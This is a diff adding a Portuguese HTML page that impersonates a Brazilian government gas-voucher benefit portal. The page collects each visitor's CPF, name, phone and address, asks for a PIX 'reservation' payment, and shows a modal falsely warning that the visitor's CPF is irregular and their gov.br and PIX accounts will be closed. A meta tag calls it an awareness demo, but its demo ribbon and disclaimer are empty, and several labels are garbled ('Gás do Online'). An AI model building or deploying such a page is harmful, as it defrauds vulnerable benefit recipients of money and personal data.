@@ -1,0 +1,1824 @@
+<html lang="pt-BR" class="js-focus-visible" data-js-focus-visible=""><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Demonstração Online de conscientização sobre golpes de benefícios. Nenhuma informação é real.">
+    <meta name="robots" content="noindex, nofollow">
+
+    <title>Gás do Online</title>
+
+    <!-- Design System do Governo Federal -->
+    <link rel="stylesheet" href="../cdn.jsdelivr.net/npm/%40govbr-ds/core%403.6.2/dist/core.min.css">
+    <link rel="stylesheet" href="../cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+
+    <style>
+        :root {
+            --color-primary: #1351B4;
+            --color-secondary: #071D41;
+            --color-success: #168821;
+            --color-warning: #FFCD07;
+            --color-danger: #E52207;
+            --blue-warm-vivid-70: #1351B4;
+            --pure-white: #FFFFFF;
+            --gray-10: #E0E0E0;
+            --gray-60: #666666;
+            --text-high-contrast: #111111;
+            --background-page: #F4F6FA;
+            --radius: 12px;
+            --shadow-card: 0 2px 10px rgba(7, 29, 65, 0.08);
+            --shadow-hover: 0 8px 24px rgba(7, 29, 65, 0.12);
+        }
+
+        *,
+        *::before,
+        *::after {
+            box-sizing: border-box;
+        }
+
+        html {
+            scroll-behavior: smooth;
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Rawline, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background-color: var(--background-page);
+            color: var(--text-high-contrast);
+            line-height: 1.5;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        /* === FAIXA DE DEMONSTRAÇÃO (sempre visível) === */
+        .demo-ribbon {
+            position: sticky;
+            top: 0;
+            z-index: 900;
+            background: #FFCD07;
+            color: #071D41;
+            font-weight: 800;
+            text-align: center;
+            padding: 8px 12px;
+            font-size: 0.85rem;
+            border-bottom: 3px solid #E52207;
+        }
+
+        .demo-ribbon i {
+            margin-right: 8px;
+        }
+
+        .demo-badge {
+            display: inline-block;
+            background: #E52207;
+            color: #fff;
+            font-size: 0.7rem;
+            font-weight: 800;
+            padding: 2px 8px;
+            border-radius: 20px;
+            margin-left: 8px;
+            vertical-align: middle;
+            text-transform: uppercase;
+        }
+
+        /* === ACESSIBILIDADE === */
+        .skip-link {
+            position: absolute;
+            top: -100px;
+            left: 16px;
+            background: var(--color-secondary);
+            color: var(--pure-white);
+            padding: 12px 20px;
+            border-radius: 0 0 8px 8px;
+            z-index: 1000;
+            font-weight: 600;
+            text-decoration: none;
+            transition: top 0.2s ease;
+        }
+
+        .skip-link:focus {
+            top: 0;
+        }
+
+        a:focus-visible,
+        button:focus-visible,
+        input:focus-visible,
+        select:focus-visible {
+            outline: 3px solid var(--color-warning);
+            outline-offset: 2px;
+        }
+
+        @media (prefers-reduced-motion: reduce) {
+            *,
+            *::before,
+            *::after {
+                animation-duration: 0.01ms !important;
+                animation-iteration-count: 1 !important;
+                transition-duration: 0.01ms !important;
+            }
+            html {
+                scroll-behavior: auto;
+            }
+        }
+
+        /* === HEADER === */
+        .site-header {
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
+        }
+
+        .top-bar {
+            background: var(--color-secondary);
+            color: var(--pure-white);
+            font-size: 0.8rem;
+            padding: 6px 0;
+        }
+
+        .top-bar-inner {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 12px;
+            flex-wrap: wrap;
+        }
+
+        .top-bar a {
+            color: var(--pure-white);
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .top-bar a:hover {
+            text-decoration: underline;
+        }
+
+        .brand-bar {
+            background: var(--pure-white);
+        }
+
+        .brand-bar-inner {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 16px;
+            padding: 14px 16px;
+        }
+
+        .brand {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            text-decoration: none;
+        }
+
+        .brand-icon {
+            width: 48px;
+            height: 48px;
+            flex-shrink: 0;
+            background: linear-gradient(135deg, var(--color-primary), #0C3C8C);
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--pure-white);
+            font-size: 1.4rem;
+            box-shadow: var(--shadow-card);
+        }
+
+        .brand-text {
+            display: flex;
+            flex-direction: column;
+            line-height: 1.15;
+        }
+
+        .brand-text strong {
+            color: var(--color-secondary);
+            font-size: 1.3rem;
+            letter-spacing: -0.02em;
+        }
+
+        .brand-text small {
+            color: var(--gray-60);
+            font-size: 0.75rem;
+            font-weight: 500;
+        }
+
+        .brand-flag {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: var(--color-secondary);
+            font-weight: 600;
+            font-size: 0.9rem;
+            text-decoration: none;
+        }
+
+        .brand-flag i {
+            color: #009C3B;
+        }
+
+        /* === LAYOUT === */
+        .main-content {
+            min-height: 100vh;
+            padding-bottom: 76px;
+        }
+
+        .container {
+            max-width: 1280px;
+            margin: 0 auto;
+            padding: 0 16px;
+        }
+
+        .page-content {
+            padding: 32px 0 24px;
+        }
+
+        .br-card {
+            background: white;
+            border-radius: var(--radius);
+            box-shadow: var(--shadow-card);
+            padding: 28px;
+            margin: 16px 0;
+            border: 1px solid rgba(0, 0, 0, 0.04);
+            transition: box-shadow 0.25s ease;
+        }
+
+        .br-card:hover {
+            box-shadow: var(--shadow-hover);
+        }
+
+        .page-title {
+            color: var(--color-secondary);
+            font-size: 1.6rem;
+            font-weight: 700;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .page-title i {
+            color: var(--color-primary);
+        }
+
+        .section-label {
+            color: #555;
+            font-weight: 700;
+            font-size: 0.8rem;
+            text-transform: uppercase;
+            letter-spacing: 0.06em;
+            border-bottom: 2px solid #EDF0F5;
+            padding-bottom: 8px;
+            margin-bottom: 16px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .section-label i {
+            color: var(--gray-60);
+            font-size: 0.9rem;
+        }
+
+        /* === BANNER === */
+        .banner-wrapper {
+            max-width: 1280px;
+            margin: 0 auto 1.5rem auto;
+            padding: 0 16px;
+        }
+
+        .banner-img {
+            display: block;
+            width: 100%;
+            height: auto;
+            border-radius: var(--radius);
+            box-shadow: var(--shadow-card);
+        }
+
+        @media (max-width: 576px) {
+            .banner-wrapper {
+                max-width: none;
+                padding: 0;
+                margin-bottom: 1rem;
+            }
+
+            .banner-img {
+                border-radius: 0;
+            }
+        }
+
+        /* === FORMULÁRIOS === */
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            color: var(--color-secondary);
+            font-weight: 600;
+            margin-bottom: 8px;
+            font-size: 0.95rem;
+        }
+
+        .br-input {
+            width: 100%;
+            padding: 12px 16px;
+            border: 1px solid #C8CDD6;
+            border-radius: 8px;
+            font-size: 1.05rem;
+            background: var(--pure-white);
+            transition: border-color 0.25s ease, box-shadow 0.25s ease;
+        }
+
+        .br-input:focus {
+            outline: none;
+            border-color: var(--color-primary);
+            box-shadow: 0 0 0 4px rgba(19, 81, 180, 0.12);
+        }
+
+        .form-control-custom {
+            height: 42px;
+            border: 1px solid #C8CDD6;
+            border-radius: 8px;
+            width: 100%;
+            padding: 6px 12px;
+            background: var(--pure-white);
+            font-size: 0.95rem;
+            transition: border-color 0.25s ease, box-shadow 0.25s ease;
+        }
+
+        .form-control-custom:focus {
+            outline: none;
+            border-color: var(--color-primary);
+            box-shadow: 0 0 0 4px rgba(19, 81, 180, 0.12);
+        }
+
+        .br-select {
+            width: 100% !important;
+            display: block;
+        }
+
+        select.form-control-custom:disabled {
+            background: #F2F3F5;
+            color: #8A8F98;
+            cursor: not-allowed;
+        }
+
+        /* === BOTÕES === */
+        .br-button {
+            background: var(--color-primary);
+            color: var(--pure-white);
+            border: none;
+            padding: 14px 32px;
+            border-radius: 100px;
+            font-size: 1.05rem;
+            font-weight: 600;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            transition: all 0.25s ease;
+            width: 100%;
+            display: inline-flex;
+            gap: 8px;
+        }
+
+        .br-button:hover {
+            background: #0C3C8C;
+            transform: translateY(-1px);
+            box-shadow: 0 6px 16px rgba(19, 81, 180, 0.3);
+        }
+
+        .br-button:active {
+            transform: translateY(0);
+        }
+
+        .br-button:disabled {
+            background: #9AA7BE;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
+        .br-button.secondary {
+            background: #fff;
+            color: var(--color-primary);
+            border: 2px solid var(--color-primary);
+        }
+
+        .br-button.secondary:hover {
+            background: var(--color-primary);
+            color: var(--pure-white);
+            box-shadow: 0 6px 16px rgba(19, 81, 180, 0.3);
+        }
+
+        .br-button .spinner {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid rgba(255, 255, 255, 0.35);
+            border-top-color: #fff;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+            flex-shrink: 0;
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        /* === VALIDAÇÃO === */
+        .is-invalid {
+            border-color: #E52207 !important;
+            background-color: #FFF5F5;
+        }
+
+        .is-valid {
+            border-color: #168821 !important;
+            background-color: #F0FFF4;
+        }
+
+        .error-message {
+            color: #B71C1C;
+            font-size: 0.875rem;
+            margin-top: 8px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .error-message i {
+            font-size: 1rem;
+        }
+
+        .success-message {
+            color: #168821;
+            font-size: 0.875rem;
+            margin-top: 8px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .success-message i {
+            font-size: 1rem;
+        }
+
+        /* === MENSAGENS === */
+        .br-message {
+            padding: 16px;
+            border-radius: 10px;
+            margin: 16px 0;
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+        }
+
+        .br-message i {
+            margin-top: 2px;
+            font-size: 1.2rem;
+        }
+
+        .br-message.info {
+            background: #E6F2FF;
+            border-left: 4px solid var(--color-primary);
+            color: var(--color-secondary);
+        }
+
+        .br-message.success {
+            background: #E8F5E9;
+            border-left: 4px solid var(--color-success);
+            color: #1B5E20;
+        }
+
+        .br-message.danger {
+            background: #FFEBEE;
+            border-left: 4px solid var(--color-danger);
+            color: #B71C1C;
+        }
+
+        .br-message.warning {
+            background: #FFF8E1;
+            border-left: 4px solid #F57C00;
+            color: #4A4A4A;
+        }
+
+        /* === RESULTADOS S === */
+        .resultado-box {
+            display: none;
+        }
+
+        .resultado-box.visivel {
+            display: block;
+            animation: aparecer 0.4s ease;
+        }
+
+        @keyframes aparecer {
+            from {
+                opacity: 0;
+                transform: translateY(8px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .direito-badge {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            background: linear-gradient(135deg, #E8F5E9, #C8E6C9);
+            border: 2px dashed var(--color-success);
+            border-radius: var(--radius);
+            padding: 20px;
+            margin: 16px 0;
+        }
+
+        .direito-badge i {
+            font-size: 2rem;
+            color: var(--color-success);
+            flex-shrink: 0;
+        }
+
+        .direito-badge strong {
+            color: #145A32;
+            font-size: 1.15rem;
+        }
+
+        .direito-badge span {
+            color: #1B5E20;
+        }
+
+        /* === CARDS DE REVENDA === */
+        .revenda-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+            gap: 16px;
+            margin: 16px 0;
+        }
+
+        .revenda-card {
+            background: #fff;
+            border: 1px solid #E3E8EF;
+            border-radius: var(--radius);
+            padding: 18px;
+            box-shadow: var(--shadow-card);
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            position: relative;
+            transition: box-shadow 0.25s ease, border-color 0.25s ease;
+        }
+
+        .revenda-card.destaque {
+            border: 2px solid var(--color-success);
+            box-shadow: 0 0 0 4px rgba(22, 136, 33, 0.12);
+        }
+
+        .tag-vantagem {
+            position: absolute;
+            top: -12px;
+            right: 12px;
+            background: var(--color-success);
+            color: #fff;
+            font-size: 0.7rem;
+            font-weight: 800;
+            text-transform: uppercase;
+            padding: 4px 10px;
+            border-radius: 20px;
+        }
+
+        .revenda-nome {
+            font-weight: 700;
+            color: var(--color-secondary);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .revenda-nome i {
+            color: var(--color-primary);
+        }
+
+        .revenda-endereco {
+            font-size: 0.85rem;
+            color: var(--gray-60);
+            line-height: 1.4;
+        }
+
+        .revenda-preco {
+            display: flex;
+            align-items: baseline;
+            gap: 6px;
+        }
+
+        .revenda-preco .valor {
+            font-size: 1.5rem;
+            font-weight: 800;
+            color: var(--color-secondary);
+        }
+
+        .revenda-preco .moeda {
+            color: var(--gray-60);
+            font-size: 0.85rem;
+            font-weight: 600;
+        }
+
+        .revenda-extra {
+            font-size: 0.8rem;
+            font-weight: 600;
+            color: #145A32;
+            background: #E8F5E9;
+            border-radius: 6px;
+            padding: 6px 10px;
+        }
+
+        .revenda-card .br-button {
+            margin-top: auto;
+            padding: 10px 16px;
+            font-size: 0.95rem;
+        }
+
+        /* === PAGAMENTO / PIX  === */
+        .pix-box {
+            border: 2px dashed #B5C6E8;
+            background: #F7FAFF;
+            border-radius: var(--radius);
+            padding: 20px;
+            margin: 16px 0;
+            text-align: center;
+        }
+
+        .pix-qr {
+            background: #fff;
+            border: 1px solid #D5DCE8;
+            border-radius: 12px;
+            padding: 12px;
+            display: inline-block;
+            margin: 12px 0;
+        }
+
+        .pix-qr canvas {
+            display: block;
+            width: 180px;
+            height: 180px;
+        }
+
+        .pix-code {
+            background: #fff;
+            border: 1px solid #D5DCE8;
+            border-radius: 8px;
+            padding: 10px;
+            font-family: Consolas, "Courier New", monospace;
+            font-size: 0.8rem;
+            word-break: break-all;
+            text-align: left;
+            color: #333;
+            max-height: 96px;
+            overflow-y: auto;
+            margin: 12px 0;
+            cursor: pointer;
+            user-select: all;
+        }
+
+        .btn-copiar {
+            background: var(--color-primary);
+            color: #fff;
+            border: none;
+            border-radius: 100px;
+            padding: 10px 20px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.25s ease;
+        }
+
+        .btn-copiar:hover {
+            background: #0C3C8C;
+        }
+
+        .aviso-simulacao {
+            margin-top: 12px;
+            font-size: 0.85rem;
+            color: #B71C1C;
+            font-weight: 700;
+        }
+
+        /* === MODAL DE SAÍDA (Online) === */
+        .modal-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.65);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 950;
+            padding: 16px;
+        }
+
+        .modal-overlay.visivel {
+            display: flex;
+        }
+
+        .modal-box {
+            background: #fff;
+            border-radius: var(--radius);
+            max-width: 520px;
+            width: 100%;
+            padding: 28px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            position: relative;
+            animation: aparecer 0.3s ease;
+        }
+
+        .modal-fechar {
+            position: absolute;
+            top: 12px;
+            right: 12px;
+            background: none;
+            border: none;
+            font-size: 1.3rem;
+            cursor: pointer;
+            color: var(--gray-60);
+        }
+
+        /* === COMO USAR O VALE === */
+        .feature-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+            gap: 16px;
+            margin-top: 8px;
+        }
+
+        .feature-item {
+            display: flex;
+            gap: 14px;
+            align-items: flex-start;
+            padding: 16px;
+            background: #F7F9FC;
+            border: 1px solid #E8ECF2;
+            border-radius: 10px;
+        }
+
+        .feature-item i {
+            font-size: 1.4rem;
+            color: var(--color-primary);
+            margin-top: 2px;
+            flex-shrink: 0;
+        }
+
+        .feature-item strong {
+            color: var(--color-secondary);
+            display: block;
+            margin-bottom: 2px;
+        }
+
+        .feature-item span {
+            color: var(--text-high-contrast);
+            font-size: 0.9rem;
+        }
+
+        /* === FOOTER FIXO === */
+        .footer-help {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: var(--pure-white);
+            padding: 10px 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            box-shadow: 0 -2px 8px rgba(0, 0, 0, 0.1);
+            border-top: 1px solid var(--gray-10);
+            z-index: 100;
+        }
+
+        .footer-help a {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            color: var(--blue-warm-vivid-70);
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 14px;
+            border-radius: 8px;
+            padding: 4px;
+        }
+
+        .phone-icon {
+            background: var(--blue-warm-vivid-70);
+            color: var(--pure-white);
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+
+        .phone-icon svg {
+            width: 18px;
+            height: 18px;
+            fill: white;
+        }
+
+        .help-text {
+            display: flex;
+            flex-direction: column;
+            line-height: 1.2;
+        }
+
+        .help-text small {
+            font-weight: 400;
+            font-size: 11px;
+            color: var(--text-high-contrast);
+        }
+
+        .disclaimer-footer {
+            background: #FFEBEE;
+            border-top: 3px solid #E52207;
+            padding: 14px 16px;
+            text-align: center;
+            font-size: 0.8rem;
+            font-weight: 600;
+            color: #B71C1C;
+        }
+
+        /* === RESPONSIVO === */
+        @media (max-width: 768px) {
+            .page-title {
+                font-size: 1.35rem;
+            }
+
+            .br-card {
+                padding: 20px;
+            }
+
+            .brand-text strong {
+                font-size: 1.1rem;
+            }
+
+            .brand-flag {
+                display: none;
+            }
+        }
+    </style>
+
+
+    <script async="" src="https://www.googletagmanager.com/gtag/js?id=G-BJRRQEZFBD"></script>
+    <script>
+      globalThis.dataLayer = globalThis.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-BJRRQEZFBD');
+    </script>
+
+
+</head>
+<body>
+    <a href="#conteudo" class="skip-link">Pular para o conteúdo principal</a>
+
+    <!-- FAIXA Online SEMPRE VISÍVEL -->
+    
+
+    
+    
+
+    <!-- Conteúdo Principal -->
+    <main class="main-content" id="conteudo">
+
+<!-- Banner -->
+<div class="banner-wrapper">
+  <img src="static/images/home_banner_defeso.png" alt="Banner ilustrativo da Online Online do Gás do Online" class="banner-img">
+</div>
+
+<div class="page-content">
+    <div class="container">
+
+        <!-- GRID PRINCIPAL -->
+        <div class="row d-flex align-items-stretch">
+
+            <!-- COLUNA 1: CONSULTA (SIMULADA) -->
+            <div class="col-lg-6 mb-3">
+                <div class="br-card h-100 d-flex flex-column">
+                    <h1 class="page-title">
+                        <i class="fas fa-search" aria-hidden="true"></i>
+                        Consulte seu Benefício
+                    </h1>
+
+                    
+
+                    <form method="POST" id="consultaForm" class="mt-4 flex-grow-1 d-flex flex-column" novalidate="">
+                        <div class="form-group">
+                            <label for="cpf">
+                                CPF do Responsável Familiar
+                            </label>
+                            <input type="text" id="cpf" name="cpf" class="br-input form-control-custom" placeholder="000.000.000-00" maxlength="14" required="" autocomplete="off" inputmode="numeric" aria-describedby="cpf-help" aria-label="Digite seu CPF">
+                            <small id="cpf-help" style="color: var(--gray-60); margin-top: 6px; display: block;"></small>
+                        </div>
+
+                        <div class="mt-auto">
+                            <button type="submit" id="btnConsultar" class="br-button primary block w-100 mt-2">
+                                Consultar Benefício
+                            </button>
+                        </div>
+                    </form>
+                </div>
+            </div>
+
+            <!-- COLUNA 2: REVENDAS (SIMULADAS) -->
+            <div class="col-lg-6 mb-3">
+                <div class="br-card h-100 d-flex flex-column">
+                    <h1 class="page-title">
+                        <i class="fas fa-map-marker-alt" aria-hidden="true"></i>
+                        Encontre uma Revenda
+                    </h1>
+
+                    <div id="revendaErrorBox" class="br-message danger" role="alert" aria-live="assertive" style="display: none;">
+          
+                        <div id="revendaErrorText"></div>
+                    </div>
+
+                    <form id="formRevendasHome" class="mt-4 flex-grow-1 d-flex flex-column" novalidate="">
+
+                        <!-- Busca por Localização -->
+                        <div class="mb-0 mt-0">
+                            <h6 class="section-label">
+                                <i class="fas fa-map-pin" aria-hidden="true"></i> Por Localização
+                            </h6>
+
+                            <div class="row no-gutters">
+                                <div class="col-3 pr-2" style="padding-right: 10px;">
+                                    <div class="form-group mb-0">
+                                        <label for="home_uf" style="font-size: 0.9rem; font-weight: 600;">
+                                            <i class="fas fa-map" style="margin-right: 4px;"></i> UF
+                                        </label>
+                                        <select id="home_uf" name="uf" onchange="carregarMunicipiosHome()" class="form-control-custom" aria-label="Selecione o estado">
+                                            <option value="">UF</option>
+                                            <option value="AC">AC</option>
+                                            <option value="AL">AL</option>
+                                            <option value="AP">AP</option>
+                                            <option value="AM">AM</option>
+                                            <option value="BA">BA</option>
+                                            <option value="CE">CE</option>
+                                            <option value="DF">DF</option>
+                                            <option value="ES">ES</option>
+                                            <option value="GO">GO</option>
+                                            <option value="MA">MA</option>
+                                            <option value="MT">MT</option>
+                                            <option value="MS">MS</option>
+                                            <option value="MG">MG</option>
+                                            <option value="PA">PA</option>
+                                            <option value="PB">PB</option>
+                                            <option value="PR">PR</option>
+                                            <option value="PE">PE</option>
+                                            <option value="PI">PI</option>
+                                            <option value="RJ">RJ</option>
+                                            <option value="RN">RN</option>
+                                            <option value="RS">RS</option>
+                                            <option value="RO">RO</option>
+                                            <option value="RR">RR</option>
+                                            <option value="SC">SC</option>
+                                            <option value="SP">SP</option>
+                                            <option value="SE">SE</option>
+                                            <option value="TO">TO</option>
+                                        </select>
+                                    </div>
+                                </div>
+
+                                <div class="col-9 pl-0">
+                                    <div class="form-group mb-0">
+                                        <label for="home_municipio" style="font-size: 0.9rem; font-weight: 600;">
+                                            <i class="fas fa-city" style="margin-right: 4px;"></i> Município
+                                        </label>
+                                        <select id="home_municipio" name="municipio" onchange="carregarBairrosHome()" disabled="" class="form-control-custom" aria-label="Selecione o município">
+                                            <option value="">Selecione UF...</option>
+                                        </select>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div class="form-group mt-2">
+                                <label for="home_bairro" style="font-size: 0.9rem; font-weight: 600;">
+                                    <i class="fas fa-building" style="margin-right: 6px;"></i> Bairro (Opcional)
+                                </label>
+                                <select id="home_bairro" name="bairro" disabled="" class="form-control-custom" aria-label="Selecione o bairro">
+                                    <option value="">Todos</option>
+                                </select>
+                            </div>
+                        </div>
+
+                        <!-- Busca por CEP -->
+                        <div class="mb-0 mt-1">
+                            <h6 class="section-label">
+                                <i class="fas fa-envelope" aria-hidden="true"></i> Ou por CEP
+                            </h6>
+                            <div class="form-group mb-0">
+                                <label for="home_cep">CEP</label>
+                                <input id="home_cep" name="cep" type="text" class="br-input form-control-custom" placeholder="00000-000" maxlength="9" inputmode="numeric" onkeyup="mascaraCepHome(this)" aria-label="Digite o CEP">
+                                <small class="text-danger" id="cep-error-home" style="display: none; margin-top: 4px;">
+                                     Digite o CEP completo (8 dígitos).
+                                </small>
+                            </div>
+                        </div>
+
+                        <div class="mt-auto">
+                            <button type="submit" id="btnBuscarRevendas" class="br-button primary block w-100 mt-4">
+                                Buscar Revendas
+                            </button>
+                        </div>
+                    </form>
+                </div>
+            </div>
+
+        </div> <!-- Fim da Row -->
+
+        <!-- ============ RESULTADO DA CONSULTA () ============ -->
+        <div id="resultadoConsulta" class="resultado-box">
+            <div class="br-card">
+                <div class="direito-badge">
+                    <i class="fas fa-gift" aria-hidden="true"></i>
+                    <div>
+                        <strong>VOCÊ TEM DIREITO A 1 VALE GÁS GRATUITO TODO MÊS E UMA CESTA BÁSICA DIGITAL</strong>
+                    </div>
+                </div>
+                    
+                    <div>
+                        <strong>
+                    </div>
+                </div>
+                
+                  
+            </div>
+        </div>
+
+        <!-- ============ RESULTADO DE REVENDAS () ============ -->
+        <div id="resultadoRevendas" class="resultado-box">
+            <div class="br-card">
+                <h3 class="page-title" style="font-size: 1.35rem;">
+                    <i class="fas fa-gas-pump" aria-hidden="true"></i>
+                    Revendas na sua região (Online)
+                </h3>
+                <div id="revendaCards" class="revenda-grid"></div>
+                
+                    
+                    <div>
+                        <strong>Aviso de Online:</strong> listas de "revendas" e preços abaixo "Reserve seu posto e não perca sua chance, pagamento único.
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- ============ FORMULÁRIO DE RESERVA () ============ -->
+        <div id="pagamentoSection" class="resultado-box">
+            <div class="br-card">
+                <h3 class="page-title" style="font-size: 1.35rem;">
+                    <i class="fas fa-clipboard-check" aria-hidden="true"></i>
+                    Faça sua reserva no posto (Online)
+                </h3>
+                <div class="br-message info mb-3" role="note">
+                    <i class="fas fa-money-bill-wave" aria-hidden="true"></i>
+                    <div>
+                        Pague <strong id="pagamentoPreco">R$ 0,00</strong> para fazer sua reserva no posto. <em>Reserve seu posto e não perca sua chance. Pagamento único.</em>
+                        <div style="margin-top:8px; font-weight:700; color:#B71C1C;"></div>
+                    </div>
+                </div>
+
+                <form id="reservaForm" novalidate="">
+                    <div class="form-group">
+                        <label for="reservaNome">Nome completo</label>
+                        <input type="text" id="reservaNome" name="nome" class="br-input form-control-custom" placeholder="Nome completo" required="" autocomplete="name">
+                    </div>
+                    <div class="form-group">
+                        <label for="reservaCpf">CPF</label>
+                        <input type="text" id="reservaCpf" name="cpf" class="br-input form-control-custom" placeholder="000.000.000-00" maxlength="14" required="" inputmode="numeric" onkeyup="validarCpfReserva(this)">
+                    </div>
+                    <div class="form-group">
+                        <label for="reservaTel">Telefone</label>
+                        <input type="tel" id="reservaTel" name="telefone" class="br-input form-control-custom" placeholder="(00) 00000-0000" maxlength="15" required="" inputmode="tel" onkeyup="mascaraTelReserva(this)">
+                    </div>
+                    <div class="form-group">
+                        <label for="reservaRua">Nome da rua</label>
+                        <input type="text" id="reservaRua" name="rua" class="br-input form-control-custom" placeholder="Nome da rua / avenida" required="" autocomplete="street-address">
+                    </div>
+                    <div class="form-group">
+                        <label for="reservaNumero">Número da casa</label>
+                        <input type="text" id="reservaNumero" name="numero" class="br-input form-control-custom" placeholder="Número da casa" required="" inputmode="numeric">
+                    </div>
+                    <button type="submit" id="btnReservar" class="br-button primary w-100">
+                        Reservar e gerar PIX
+                    </button>
+                </form>
+            </div>
+        </div>
+
+        <!-- ============ PIX  ============ -->
+        <div id="pixSection" class="resultado-box">
+            <div class="br-card">
+                <h3 class="page-title" style="font-size: 1.35rem;">
+                    <i class="fas fa-qrcode" aria-hidden="true"></i>
+                    Pague com PIX (Online)
+                </h3>
+
+                <div class="pix-box">
+                    <div class="pix-qr">
+                        <canvas id="pixCanvas" width="180" height="180" aria-label="QR Code  de demonstração"></canvas>
+                    </div>
+                    <div style="font-weight:700; color: var(--color-secondary);">Escaneie ou copie o código abaixo</div>
+
+                    <div class="pix-code" id="pixCode" title="Clique para copiar"></div>
+                    <button type="button" class="btn-copiar" onclick="copiarPix()">
+                        <i class="fas fa-copy" aria-hidden="true"></i> Copiar PIX copia e cola
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Como Usar o Vale -->
+        <div class="br-card mt-3">
+            <h3 class="page-title" style="font-size: 1.35rem;">
+                <i class="fas fa-question-circle" aria-hidden="true"></i>
+                Como usar o vale? (Online)
+            </h3>
+            <div class="feature-grid">
+                <div class="feature-item">
+                    <i class="fas fa-credit-card" aria-hidden="true"></i>
+                    <div>
+                        <strong>Cartão Bolsa Família</strong>
+                        <span>Apresente o cartão com chip na revenda credenciada.</span>
+                    </div>
+                </div>
+                <div class="feature-item">
+                    <i class="fas fa-id-card" aria-hidden="true"></i>
+                    <div>
+                        <strong>Cartão de Débito CAIXA</strong>
+                        <span>Use o cartão de débito da CAIXA para pagar o gás.</span>
+                    </div>
+                </div>
+                <div class="feature-item">
+                    <i class="fas fa-mobile-alt" aria-hidden="true"></i>
+                    <div>
+                        <strong>CPF + Validação no Celular</strong>
+                        <span>Informe o CPF do beneficiário e o código de validação enviado ao celular.</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+    </div>
+</div>
+
+    </main>
+
+    <!-- Footer Fixo -->
+    <div class="footer-help">
+        <a href="tel:121" aria-label="Ligar para a Central de Atendimento 121 (número real do MDS)">
+            <span class="phone-icon">
+                <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+                    <path d="M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z"></path>
+                </svg>
+            </span>
+            <span class="help-text">
+                Precisa de ajuda? Ligue <strong>121</strong>
+                <small>Central de Atendimento (ligação gratuita)</small>
+            </span>
+        </a>
+    </div>
+
+    <div class="disclaimer-footer">
+        <i class="fas fa-exclamation-circle" aria-hidden="true"></i>
+    </div>
+
+    <!-- Scripts Gov.br -->
+    <script src="../cdn.jsdelivr.net/npm/%40govbr-ds/core%403.6.2/dist/core.min.js"></script>
+
+    <!---->
+    <div class="modal-overlay" id="exitModal" role="dialog" aria-modal="true" aria-labelledby="exitModalTitle">
+        <div class="modal-box">
+            <button type="button" class="modal-fechar" onclick="fecharModalSaida()" aria-label="Fechar">
+                <i class="fas fa-times" aria-hidden="true"></i>
+            </button>
+            <div class="direito-badge" style="margin-top:0;">
+                <i class="fas fa-exclamation-triangle" aria-hidden="true"></i>
+                <div>
+                    <strong id="exitModalTitle">ATENÇÃO: CPF IRREGULAR!</strong>
+                </div>
+            </div>
+            <p>
+                Seu CPF está com <strong>pendências</strong> no sistema. Se você não regularizar agora, sua conta
+                <strong>gov.br</strong> e suas <strong>contas PIX</strong> poderão ser <strong>encerradas</strong>.
+            </p>
+            <div class="br-message warning" role="note">
+                <i class="fas fa-exclamation-triangle" aria-hidden="true"></i>
+                <div>
